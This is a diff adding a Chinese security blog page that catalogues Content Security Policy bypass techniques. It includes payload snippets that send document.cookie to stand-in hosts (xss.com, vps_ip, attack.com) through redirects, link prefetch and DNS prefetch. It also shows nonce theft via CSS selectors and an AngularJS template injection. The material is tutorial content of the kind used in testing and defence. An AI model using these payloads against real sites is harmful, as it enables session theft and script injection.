@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ashin9/ashin9.github.io/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ashin9/ashin9.github.io/images/favicon-32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ashin9/ashin9.github.io/images/favicon-16x16.ico">
+  <link rel="mask-icon" href="/ashin9/ashin9.github.io/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ashin9/ashin9.github.io/css/main.css">
+
+
+<link rel="stylesheet" href="/ashin9/ashin9.github.io/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ashin9/ashin9.github.io/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="验证CSP是否安全在线评测CSP策略 CSPEvaluator：https:&#x2F;&#x2F;csp-evaluator.withgoogle.com&#x2F;  Chrome插件 CSPEvaluator  https:&#x2F;&#x2F;chrome.google.com&#x2F;webstore&#x2F;detail&#x2F;csp-evaluator&#x2F;fjohamlofnakbnbfjkohkbdigoodcejf&#x2F;related   CSP Mit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全—CSP策略">
+<meta property="og:url" content="https://github.com/ashin9/ashin9.github.io/2018/07/02/WEB%E5%AE%89%E5%85%A82%E2%80%94CSP%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="Ashing&#39;s Blog">
+<meta property="og:description" content="验证CSP是否安全在线评测CSP策略 CSPEvaluator：https:&#x2F;&#x2F;csp-evaluator.withgoogle.com&#x2F;  Chrome插件 CSPEvaluator  https:&#x2F;&#x2F;chrome.google.com&#x2F;webstore&#x2F;detail&#x2F;csp-evaluator&#x2F;fjohamlofnakbnbfjkohkbdigoodcejf&#x2F;related   CSP Mit">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-07-02T13:00:00.000Z">
+<meta property="article:modified_time" content="2021-04-11T02:53:12.000Z">
+<meta property="article:author" content="Ashing">
+<meta property="article:tag" content="CSP策略">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://github.com/ashin9/ashin9.github.io/2018/07/02/WEB%E5%AE%89%E5%85%A82%E2%80%94CSP%E7%BB%95%E8%BF%87/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Web安全—CSP策略 | Ashing's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ashin9/ashin9.github.io/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ashing's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">想学的太多 懂得的太少</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ashin9/ashin9.github.io/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ashin9/ashin9.github.io/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ashin9/ashin9.github.io/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ashin9/ashin9.github.io/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ashin9/ashin9.github.io/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ashin9/ashin9.github.io/2018/07/02/WEB%E5%AE%89%E5%85%A82%E2%80%94CSP%E7%BB%95%E8%BF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ashin9/ashin9.github.io/images/dxx.jpg">
+      <meta itemprop="name" content="Ashing">
+      <meta itemprop="description" content="Cyber Security">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ashing's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Web安全—CSP策略
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-07-02 21:00:00" itemprop="dateCreated datePublished" datetime="2018-07-02T21:00:00+08:00">2018-07-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-11 10:53:12" itemprop="dateModified" datetime="2021-04-11T10:53:12+08:00">2021-04-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ashin9/ashin9.github.io/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ashin9/ashin9.github.io/categories/WEB%E5%AE%89%E5%85%A8/Browser%E7%AB%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Browser端安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="验证CSP是否安全"><a href="#验证CSP是否安全" class="headerlink" title="验证CSP是否安全"></a><strong>验证CSP是否安全</strong></h3><h4 id="在线评测CSP策略"><a href="#在线评测CSP策略" class="headerlink" title="在线评测CSP策略"></a><strong>在线评测CSP策略</strong></h4><ul>
+<li><strong>CSPEvaluator：</strong><a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/"><strong>https://csp-evaluator.withgoogle.com/</strong></a></li>
+</ul>
+<h4 id="Chrome插件"><a href="#Chrome插件" class="headerlink" title="Chrome插件"></a><strong>Chrome插件</strong></h4><ul>
+<li><p><strong>CSPEvaluator</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/csp-evaluator/fjohamlofnakbnbfjkohkbdigoodcejf/related"><strong>https://chrome.google.com/webstore/detail/csp-evaluator/fjohamlofnakbnbfjkohkbdigoodcejf/related</strong></a></li>
+</ul>
+</li>
+<li><p><strong>CSP Mitigator</strong></p>
+<ul>
+<li>允许将自定义CSP策略应用于应用程序。 它可以帮助您了解启用CSP的后果，识别与您的策略不兼容的应用程序部分，并指导您在部署前进行任何必要的更改。</li>
+<li><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa"><strong>https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa</strong></a></li>
+</ul>
+</li>
+</ul>
+<h3 id="0x01-明确CSP对前端攻击的防御点"><a href="#0x01-明确CSP对前端攻击的防御点" class="headerlink" title="0x01 明确CSP对前端攻击的防御点"></a><strong>0x01 明确CSP对前端攻击的防御点</strong></h3><ul>
+<li><strong>1.限制js的执行</strong></li>
+<li><strong>2.限制对不可信域的请求</strong></li>
+</ul>
+<h3 id="0x02-CSP绕过"><a href="#0x02-CSP绕过" class="headerlink" title="0x02 CSP绕过"></a><strong>0x02 CSP绕过</strong></h3><h4 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a><strong>URL跳转</strong></h4><ul>
+<li>条件：default-src ‘none’</li>
+<li>利用：meta标签实现跳转</li>
+</ul>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=<span class="link">http://www.xss.com/x.php?c=</span>[<span class="string">cookie</span>]&quot; &gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<ul>
+<li>条件：script-src ‘unsafe-inline’</li>
+<li>利用：window.location&#x2F;window.open等方法跳转绕过</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;http://www.xss.com/x.php?c=[cookie]&quot;</span>; </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>location.href</li>
+<li>条件：可以执行JS脚本，但是由于CSP的设置，我们的cookie无法带外传输，就可以采用此方法，将cookie打到我们的vps上</li>
+</ul>
+<p>location.href &#x3D; “vps_ip:xxxx?”+document.cookie CSP不影响location.href跳转，因为当今大部分网站的跳转功能都是由前端实现的，CSP如果限制跳转会影响很多的网站功能。所以，用跳转来绕过CSP获取数据是一个万能的办法。但比较容易被发现。</p>
+<ul>
+<li>利用：&lt;a&gt;标签配合站内可控JS点击操作来跳转</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  $(#foo).<span class="title function_">click</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;foo&quot;</span> <span class="attr">href</span>=<span class="string">&quot;xxxxx.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>利用：网站本身的跳转接口</li>
+</ul>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//foo.com/<span class="keyword">jmp</span>.php?url=attack.com</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="lt-link-gt-标签预加载"><a href="#lt-link-gt-标签预加载" class="headerlink" title="&lt;link&gt;标签预加载"></a><strong>&lt;link&gt;标签预加载</strong></h4><ul>
+<li>老版本的浏览器，CSP 对 link 标签的预加载功能考虑不完善。目前大部分都约束了此标签。</li>
+</ul>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="comment">&lt;!-- firefox --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;dns-prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;//$</span></span></span><span class="template-variable">&#123;cookie&#125;</span><span class="language-xml"><span class="tag"><span class="string">.vps_ip&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="language-xml">//在Firefox下无法用prefetch，因为Firefox有更高的安全规范，但是可以使用其他的方式，比如dns-prefetch，将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- chrome --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;//vps_ip?$</span></span></span><span class="template-variable">&#123;cookie&#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span>&gt;</span> //href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p>link 标签除了这两种 rel，还有 preconnect、prerender、subresource、preload 等</p>
+</li>
+<li><p>数据外带</p>
+</li>
+</ul>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var link = document.create<span class="constructor">Element(<span class="string">&quot;link&quot;</span>)</span>;</span><br><span class="line">link.set<span class="constructor">Attribute(<span class="string">&quot;rel&quot;</span>, <span class="string">&quot;prefetch&quot;</span>)</span>;</span><br><span class="line">link.set<span class="constructor">Attribute(<span class="string">&quot;href&quot;</span>, <span class="string">&quot;//vps_ip/?&quot;</span> + <span class="params">document</span>.<span class="params">cookie</span>)</span>;</span><br><span class="line">document.head.append<span class="constructor">Child(<span class="params">link</span>)</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="利用浏览器补全"><a href="#利用浏览器补全" class="headerlink" title="利用浏览器补全"></a><strong>利用浏览器补全</strong></h4><ul>
+<li>有些网站限制只有某些脚本才能使用，往往会使用&lt;script&gt; 标签的 nonce 属性，只有 nonce 一致的脚本才生效，比如 CSP 设置成下面这样</li>
+</ul>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">default-src</span> <span class="string">&#x27;none&#x27;</span>;<span class="keyword">script-src</span> <span class="string">&#x27;nonce-abc&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>那么当脚本插入点为如下的情况时</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p&gt;插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;abc&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;CSP&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>可以插入</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script <span class="attribute">src</span>=//attack.com <span class="attribute">a</span>=<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<ul>
+<li>这里利用浏览器的容错机制会拼成一个新的 script 标签，其中的 src 可以自由设定</li>
+</ul>
+<p><script src=//attack.com a="</p> <script" nonce="abc">document.write('CSP');</script>
+
+<h4 id="利用DOM-XSS"><a href="#利用DOM-XSS" class="headerlink" title="利用DOM XSS"></a><strong>利用DOM XSS</strong></h4><ul>
+<li>如果 JS 存在操作 location.hash 导致的 XSS，那么这样的攻击请求不会经过后台，那么 nonce 后的随机值就不会刷新。</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lorexxar 的博文:</span><br><span class="line">https:<span class="regexp">//</span>lorexxar.cn<span class="regexp">/2017/</span><span class="number">05</span><span class="regexp">/16/</span>nonce-bypass-script/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果有 DOM 操作可以插入 HTML 并且可以控制插入的 HTML 内容，那么也可以绕过 CSP</li>
+</ul>
+<h4 id="利用CSS静态xss获取nonce值"><a href="#利用CSS静态xss获取nonce值" class="headerlink" title="利用CSS静态xss获取nonce值"></a><strong>利用CSS静态xss获取nonce值</strong></h4><ul>
+<li>利用 CSS 选择器来逐字节获取信息，^&#x3D; 从头部判断</li>
+</ul>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^=<span class="string">&quot;a&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;record?match=a&quot;</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^=<span class="string">&quot;b&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;record?match=b&quot;</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^=<span class="string">&quot;c&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;record?match=c&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>比如确定第一位为 c，那么就会继续下面的步骤</li>
+</ul>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^=<span class="string">&quot;ca&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;record?match=ca&quot;</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^=<span class="string">&quot;cb&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;record?match=cb&quot;</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^=<span class="string">&quot;cc&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;record?match=cc&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>由于是 CSS 的变化，没有引起服务器重新请求，所以 nonce 的值不会改变，偷取值后即可执行任意 script</li>
+</ul>
+<h4 id="利用跨域传输数据"><a href="#利用跨域传输数据" class="headerlink" title="利用跨域传输数据"></a><strong>利用跨域传输数据</strong></h4><ul>
+<li>利用一些跨域传输的方法来引入 JS，导致执行</li>
+<li>呆子不开口的乌云大会 PPT</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>pan.baidu.com<span class="regexp">/s/</span><span class="number">1</span>pLCfCWr</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>0CTF2018 预选赛中的 h4xors.club2</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>lorexxar.cn<span class="regexp">/2018/</span><span class="number">04</span><span class="regexp">/10/</span><span class="number">0</span>ctf2018-club2/</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="利用文件上传执行JS"><a href="#利用文件上传执行JS" class="headerlink" title="利用文件上传执行JS"></a><strong>利用文件上传执行JS</strong></h4><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">default-src</span> <span class="string">&#x27;self&#x27;</span>; <span class="keyword">script-src</span> <span class="string">&#x27;self&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>针对只能加载同域下 script 的 CSP 策略，如果有上传点可以控制，那么可以在其中夹杂 js 代码，然后引用该文件完成执行。</li>
+</ul>
+<h4 id="利用Iframe绕过"><a href="#利用Iframe绕过" class="headerlink" title="利用Iframe绕过"></a><strong>利用Iframe绕过</strong></h4><ul>
+<li><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，可以直接在B页面新建iframe用javascript直接操作A页面的dom，A页面的CSP防护完全失效。</p>
+</li>
+<li><p><strong>A页面</strong></p>
+</li>
+</ul>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="comment">&lt;!-- A页面 --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>flag</span><span class="template-variable">&#123;0xffff&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><strong>B页面</strong></li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B页面 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 下面模拟XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">iframe.<span class="property">src</span>=<span class="string">&quot;A页面&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="title function_">alert</span>(iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerHTML</span>),<span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//setTimeout是为了等待iframe加载完成</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="用CDN绕过"><a href="#用CDN绕过" class="headerlink" title="用CDN绕过"></a><strong>用CDN绕过</strong></h4><ul>
+<li><p>引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险。</p>
+</li>
+<li><p>参考：<a target="_blank" rel="noopener" href="https://paper.seebug.org/855/"><strong>https://paper.seebug.org/855/</strong></a>采用了低版本的angular js模板注入来绕过CSP</p>
+</li>
+</ul>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://cdnjs.cloudflare.com;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- foo=&quot;--&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123;<span class="name">constructor.constructor</span>(<span class="name">&#x27;alert(document.cookie)&#x27;</span>)()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<ul>
+<li>存在低版本angular js的cdn服务商列表</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/google/</span>csp-evaluator<span class="regexp">/blob/m</span>aster<span class="regexp">/whitelist_bypasses/</span>angular.js<span class="comment">#L26-L76</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ashin9/ashin9.github.io/tags/CSP%E7%AD%96%E7%95%A5/" rel="tag"># CSP策略</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ashin9/ashin9.github.io/2018/07/02/Web%E5%AE%89%E5%85%A82%E2%80%94CSP%E7%AD%96%E7%95%A5/" rel="prev" title="Web安全—CSP策略">
+      <i class="fa fa-chevron-left"></i> Web安全—CSP策略
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ashin9/ashin9.github.io/2018/07/03/Web%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%831%E2%80%94Cookie:Seesion%20Auth/" rel="next" title="Web认证授权1—Cookie/Seesion Auth">
+      Web认证授权1—Cookie/Seesion Auth <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
